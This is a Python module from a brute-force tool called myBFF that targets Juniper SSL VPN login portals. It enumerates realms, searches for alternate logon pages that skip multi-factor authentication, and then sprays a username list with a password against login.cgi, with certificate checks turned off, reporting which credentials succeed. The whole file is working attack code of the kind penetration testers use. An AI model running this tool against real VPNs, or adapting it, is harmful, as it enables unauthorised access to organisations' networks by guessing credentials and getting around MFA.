#! /usr/bin/python
# Created by Kirk Hayes (l0gan) @kirkphayes
# Part of myBFF
from requests import session
import requests
import re
from argparse import ArgumentParser

class JuniperBrute():
    ignore = ['tz_offset','btnSubmit']
    URLS = []
    nomfaurls = []
    def urlCheck(self, config, c, URL):
        print("[!] Checking for other logon pages...")
        for n in range(1, 20):
            URL = 'url_' + str(n)
            u = c.get(config["HOST"] + '/dana-na/auth/' + URL + '/welcome.cgi', allow_redirects=False, verify=False)
            if u.status_code == 200:
                self.URLS.append(URL)

    def MFACheck(self, c, config, URL):
        print("[!] Checking to see if MultiFactor Authentication is required for " + URL + "...")
        mfa = c.get(config["HOST"] + '/dana-na/auth/' + URL + '/welcome.cgi', allow_redirects=False, verify=False)
        m = re.findall('<input (.*?)>', mfa.text, re.DOTALL)
        n = re.findall('password', str(m))
        o = re.search('Missing certificate', mfa.text)
        if n.count("password") > 3:
            print("[-]  MultiFactor Authentication Required for " + URL + "!")
            return True
        elif o:
            print("[-]  MultiFactor Authentication Required for " + URL + "!")
            return True
        else:
            print("[+]  MultiFactor Authentication is not on. Continuing...")
            self.nomfaurls.append(URL)
            return False
    def connectTest(self, config, payload, URL):
        with session() as c:
            if 'url_default' in self.nomfaurls:
                URL = 'url_default'
            else:
                URL = self.nomfaurls[0]
            cpost = c.post(config["HOST"] + '/dana-na/auth/' + URL + '/login.cgi', data=payload, allow_redirects=False, verify=False)
            m = re.search('p=user-confirm', str(cpost.headers))
            if m:
                print("[+]  User Credentials Successful: " + config["USERNAME"] + ":" + config["PASSWORD"])
            else:
                print("[-]  Login Failed for: " + config["USERNAME"] + ":" + config["PASSWORD"])
    def payload(self, config):
        with session() as c:
            requests.packages.urllib3.disable_warnings()
            cget = c.get(config["HOST"] + '/dana-na/auth/welcome.cgi', allow_redirects=True, verify=False)
            if cget.cookies:
                URL = cget.cookies['DSSIGNIN']
            else:
                URL = "url_default"
            m = re.findall("<select id=(.*?)select>", cget.text, re.DOTALL)
            n = re.findall("<option(.*?)>(.*?)</option>", str(m), re.DOTALL)
            if n:
                print("[!] The following realms are available:  ")
                for o in n:
                    print("[+]             " + o[1])
                    realm = o[1]
            else:
                print("[+]  No realms available...")
                realm = ""
            MFAused = self.MFACheck(c, config, URL)
            #Check for existence of a second factor MFACheck()
            #if MFACheck() returns TRUE, run urlCheck()
            if MFAused:
                self.urlCheck(config, c, URL)
                for URL in self.URLS:
                    self.MFACheck(c, config, URL)
            else:
                self.nomfaurls.append('url_default')
        if self.nomfaurls:
            if config["UserFile"]:
                lines = [line.rstrip('\n') for line in open(config["UserFile"])]
                for line in lines:
                    config["USERNAME"] = line.strip('\n')
                    payload = {
                    'tz_offset': '-360',
                    'username': config["USERNAME"],
                    'password': config["PASSWORD"],
                    'realm': realm,
                    'btnSubmit': 'Sign+In'
                    }
                    self.connectTest(config, payload, URL)
            else:
                payload = {
                'tz_offset': '-360',
                'username': config["USERNAME"],
                'password': config["PASSWORD"],
                'realm': realm,
                'btnSubmit': 'Sign+In'
                }
                self.connectTest(config, payload, URL)
        else:
            print "[-] All pages require MFA. Aborting..."
